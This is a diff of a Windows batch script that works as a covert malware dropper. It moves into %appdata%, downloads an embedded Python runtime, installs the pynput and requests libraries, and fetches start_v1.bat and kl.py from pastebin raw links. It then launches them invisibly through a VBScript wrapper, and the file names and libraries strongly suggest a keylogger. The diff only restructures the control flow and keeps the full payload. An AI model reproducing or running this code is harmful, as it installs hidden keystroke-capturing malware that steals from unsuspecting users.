@@ -2,23 +2,33 @@ echo off
 cls
 cd %appdata%
 
-if exist python\kl.py if exist python\start_v1.bat (
-	cd python
-	wscript.exe "%appdata%/invisible.vbs" "start_v1.bat"
+if exist py\kl.py (
+	if exist py\start_v1.bat (
+		cd py
+		GOTO run
+	) else (
+	GOTO install
+	)
 ) else (
-	mkdir python
-	cd python
-	powershell -Command "Invoke-WebRequest https://www.python.org/ftp/python/3.10.9/python-3.10.9-embed-amd64.zip -Outfile python.zip"
-	tar -xf python.zip
-	powershell -Command "Invoke-WebRequest https://bootstrap.pypa.io/get-pip.py -Outfile get-pip.py"
-	powershell -Command "Invoke-WebRequest https://pastebin.com/raw/dzRvGa3K -Outfile python310._pth"
-	python.exe get-pip.py
-	cd Scripts
-	pip install requests
-	pip install pynput
-	cd %appdata%
-	cd python
-	powershell -Command "Invoke-WebRequest https://pastebin.com/raw/JfMVZVEs -Outfile start_v1.bat"
-	powershell -Command "Invoke-WebRequest https://pastebin.com/raw/tbaYcG47 -Outfile kl.py"
-	wscript.exe "%appdata%/invisible.vbs" "start_v1.bat"
+	GOTO install
 )
+
+:install
+mkdir py
+cd py
+powershell -Command "Invoke-WebRequest https://www.python.org/ftp/python/3.10.9/python-3.10.9-embed-amd64.zip -Outfile python.zip"
+tar -xf python.zip
+powershell -Command "Invoke-WebRequest https://bootstrap.pypa.io/get-pip.py -Outfile get-pip.py"
+powershell -Command "Invoke-WebRequest https://pastebin.com/raw/dzRvGa3K -Outfile python310._pth"
+python.exe get-pip.py
+cd Scripts
+pip install requests
+pip install pynput
+cd %appdata%
+cd py
+powershell -Command "Invoke-WebRequest https://pastebin.com/raw/JfMVZVEs -Outfile start_v1.bat"
+powershell -Command "Invoke-WebRequest https://pastebin.com/raw/tbaYcG47 -Outfile kl.py"
+GOTO run
+
+:run
+wscript.exe "%appdata%/invisible.vbs" "start_v1.bat"
